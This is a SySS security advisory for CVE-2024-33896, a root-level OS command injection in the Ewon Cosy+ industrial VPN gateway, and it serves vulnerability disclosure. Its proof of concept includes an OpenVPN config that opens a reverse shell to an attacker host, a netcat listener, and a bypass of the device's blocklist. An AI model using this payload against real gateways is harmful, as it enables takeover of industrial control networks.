Tested Version(s):         Firmware Version: 21.2s7
Vulnerability Type:        Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
(CWE-78)
Risk Level:                Medium
Solution Status:           Fixed
Manufacturer Notification: 2024-03-27
Solution Date:             2024-07-18
Public Disclosure:         2024-08-11
CVE Reference:             CVE-2024-33896
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The Ewon Cosy+ is a VPN gateway used for remote access and maintenance
in industrial environments.

The manufacturer describes the product as follows (see [1]):

"The Ewon Cosy+ gateway establishes a secure VPN connection between
the machine (PLC, HMI, or other devices) and the remote engineer.
The connection happens through Talk2m, a highly secured industrial
cloud service. The Ewon Cosy+ makes industrial remote access easy
and secure like never before!"

Due to improper neutralization of parameters read from a user-controlled
configuration file, an authenticated attacker is able to inject and execute
OS commands on the device.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

Authenticated attackers are able to upload a custom OpenVPN configuration.
This configuration can contain the OpenVPN paramaters "--up" and "--down",
which execute a specified script or executable.

Since the process itself runs with the highest privileges (root),
this allows the device to be completely compromised.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

1. Generate a malicious OpenVPN configuration, e.g. instructing the device
    to create a reverse shell:

    client
    dev tun
    persist-tun
    proto tcp
    verb 5
    mute 20
    --up '/bin/sh -c "TF=$(mktemp -u);mkfifo $TF;telnet <attacker-ip> 5000 0<$TF | sh 1>$TF"'
    script-security 2
        [...]

2. Start a listener on the attacker system:
    #> nc -lvp 5000

3. Upload the OpenVPN configuration via FTP to Cosy+.

4. Set the configuration paramater "VPNCfgFile" to "/usr/<vpnfile>".

5. Command is executed by Cosy+ and a reverse shell is initiated:

    nc -lvp 5000
    istening on 0.0.0.0 5000
    Connection received on 192.168.10.240 56806
    id
    uid=0(root) gid=0(root)

Note:
    The paramaters "--up" and "--down" need to be specified with
    two dashes since the values "up" and "down" are blocklisted on the
    device.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

According to the manufacturer note[4], the vulnerability was fixed
with the firmware versions 21.2s10 and 22.1s3.
